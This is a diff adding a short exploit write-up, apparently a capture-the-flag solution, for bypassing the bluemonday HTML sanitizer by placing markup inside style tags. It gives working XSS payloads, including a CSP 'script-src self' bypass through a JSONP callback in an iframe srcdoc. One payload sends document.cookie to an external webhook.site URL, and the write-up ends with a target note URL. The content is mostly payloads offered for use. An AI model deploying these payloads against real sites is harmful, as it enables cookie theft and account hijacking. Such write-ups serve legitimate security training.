@@ -1,0 +1,16 @@
+
+because there's is this line of code that disable html encoding on "style" and "script"
+https://github.com/microcosm-cc/bluemonday/blob/0eb99d24d2c54b9ade957a8c60efbb8ab9c7523c/sanitize.go#L431
+
+and xhtml didn't support inline styling, we can use this payload to bypass the sanitizer:
+
+<style><img src="x" onerror="alert(1)"></img></style>
+
+
+for bypassing CSP `script-src 'self'` you can use jsonp endpoint to craft your own JS file and embed it onto iframe to further
+execution
+
+<style><iframe srcdoc="&lt;script src='/static/f?callback=alert(`1`)//'>&lt;/script>"></iframe></style>
+<style><iframe srcdoc="&lt;script src='/static/f?callback=fetch(`https://webhook.site/cc4894b6-cae9-4b2e-944e-d09b52e47041?${document.cookie}`)//'>&lt;/script>"></iframe></style>
+
+http://app:8080/note/7afa9c4b-3961-4053-b4ba-6aaf87ee3736
